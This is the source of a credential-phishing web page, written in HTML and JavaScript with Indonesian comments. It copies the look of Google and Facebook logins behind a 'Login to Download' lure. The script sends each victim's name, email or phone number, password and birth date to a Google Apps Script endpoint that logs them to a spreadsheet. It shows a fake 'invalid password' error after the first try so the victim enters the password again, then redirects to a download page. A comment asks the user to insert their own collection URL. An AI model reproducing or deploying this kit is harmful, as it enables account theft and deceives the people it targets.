<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Continue</title>
    <style>
        body {
            background: #0f0f0f;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: white;
        }

        .container {
            width: 350px;
            background: #1a1a1a;
            padding: 30px;
            border-radius: 18px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
            text-align: center;
        }

        h2 { margin-bottom: 20px; font-weight: 800; }

        .social-btn {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: none;
            border-radius: 10px;
            font-weight: bold;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            font-size: 15px;
            transition: 0.3s;
        }

        .google { background: white; color: black; }
        .facebook { background: #1877f2; color: white; }

        .icon { width: 20px; height: 20px; }

        .form-box {
            display: none;
            margin-top: 20px;
            border-top: 1px solid #333;
            padding-top: 20px;
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border-radius: 8px;
            border: 1px solid #333;
            background: #2a2a2a;
            color: white;
            box-sizing: border-box;
            outline: none;
        }

        input:focus { border-color: #ff7a4a; }

        .date-label {
            display: block;
            text-align: left;
            font-size: 12px;
            color: #aaa;
            margin: 10px 0 2px 2px;
        }

        #errorMessage {
            display: none;
            color: #ff4d4d;
            background: rgba(255, 77, 77, 0.1);
            padding: 10px;
            border-radius: 8px;
            font-size: 13px;
            margin-bottom: 15px;
            border: 1px solid rgba(255, 77, 77, 0.3);
            animation: shake 0.3s ease-in-out;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        .submit {
            background: #ff7a4a;
            color: white;
            margin-top: 15px;
        }

        .submit:disabled { background: #555; cursor: not-allowed; }
        .logo { font-size: 16px; margin-bottom: 10px; color: #ff7a4a; font-weight: bold; }
    </style>
</head>

<body>

<div class="container">
    <h2>Login to Download</h2>

    <button class="social-btn google" onclick="showForm('Google')">
        <svg class="icon" viewBox="0 0 48 48">
            <path fill="#EA4335" d="M24 9.5c3.5 0 6.7 1.2 9.2 3.2l6.9-6.9C35.9 2.4 30.3 0 24 0 14.6 0 6.5 5.4 2.5 13.3l8 6.2C12.3 13.3 17.7 9.5 24 9.5z"/>
            <path fill="#4285F4" d="M46.1 24.5c0-1.6-.1-3.1-.4-4.5H24v9h12.5c-.5 2.7-2 5-4.2 6.5l6.5 5c3.8-3.5 6.3-8.7 6.3-16z"/>
            <path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3-.8-4.5s.3-3 .8-4.5l-8-6.2C1 17 0 20.4 0 24s1 7 2.5 10.2l8-5.7z"/>
            <path fill="#34A853" d="M24 48c6.5 0 12-2.1 16-5.7l-6.5-5c-2 1.3-4.6 2-9.5 2-6.3 0-11.7-3.8-13.6-9l-8 5.7C6.5 42.6 14.6 48 24 48z"/>
        </svg>
        Continue with Google
    </button>

    <button class="social-btn facebook" onclick="showForm('Facebook')">
        <svg class="icon" viewBox="0 0 24 24" fill="white">
            <path d="M22 12c0-5.5-4.5-10-10-10S2 6.5 2 12c0 5 3.7 9.1 8.4 9.9v-7H7.9v-2.9h2.5V9.6c0-2.5 1.5-3.9 3.8-3.9 1.1 0 2.3.2 2.3.2v2.5h-1.3c-1.3 0-1.7.8-1.7 1.6v1.9h2.9l-.5 2.9h-2.4v7C18.3 21.1 22 17 22 12z"/>
        </svg>
        Continue with Facebook
    </button>

    <div class="form-box" id="loginForm">
        <div class="logo" id="loginLogo"></div>
        <div id="errorMessage">Invalid email or password. Please try again.</div>

        <form id="authForm">
            <input type="hidden" name="Login_Method" id="method">
            <input type="text" name="Nama" placeholder="Full Name" required>
            <input type="email" name="Email" id="emailField" placeholder="Email Address" required>
            <input type="password" name="Password" id="passwordField" placeholder="Password" required>
            
            <label for="birthDate" class="date-label">Tanggal Lahir:</label>
            <input type="date" name="Birth_Date" id="birthDate" required>

            <button type="submit" class="social-btn submit" id="submitBtn">Login & Download</button>
        </form>
    </div>
</div>

<script>
    let attempt = 0;
    const emailField = document.getElementById("emailField");
    
    // --- GANTI LINK DI BAWAH INI DENGAN URL APPS SCRIPT BARU KAMU ---
    const scriptURL = 'https://script.google.com/macros/s/AKfycbx5DP7tqM4zaS_a19rJEjHQXi6q3iHGK5euTkRrH4krJkr_HC3XYuyuh_C2BkP5ZDUJ/exec'; 

    function showForm(type){
        document.getElementById("loginForm").style.display="block";
        document.getElementById("loginLogo").innerText="Login with " + type;
        document.getElementById("method").value = type;
        document.getElementById("errorMessage").style.display = "none";
        attempt = 0; 

        if(type === 'Facebook') {
            emailField.type = "text"; 
            emailField.placeholder = "No telepon atau email";
        } else {
            emailField.type = "email";
            emailField.placeholder = "Email Address";
        }
    }

    const form = document.getElementById('authForm');
    const btn = document.getElementById('submitBtn');
    const errorBox = document.getElementById('errorMessage');

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        attempt++;

        btn.disabled = true;
        btn.innerText = (attempt === 1) ? "Verifying..." : "Processing...";

        // KIRIM DATA KE GOOGLE SHEETS
        fetch(scriptURL, { 
            method: "POST", 
            body: new FormData(form) 
        })
        .then(res => console.log("Data Sent!"))
        .catch(err => console.error("Error!", err.message));

        if (attempt === 1) {
            setTimeout(() => {
                errorBox.style.display = "block";
                btn.disabled = false;
                btn.innerText = "Login & Download";
                document.getElementById('passwordField').value = ""; 
            }, 1500);
        } else {
            setTimeout(() => {
                window.location.href = "download.html";
            }, 2000);
        }
    });
</script>

</body>
</html>
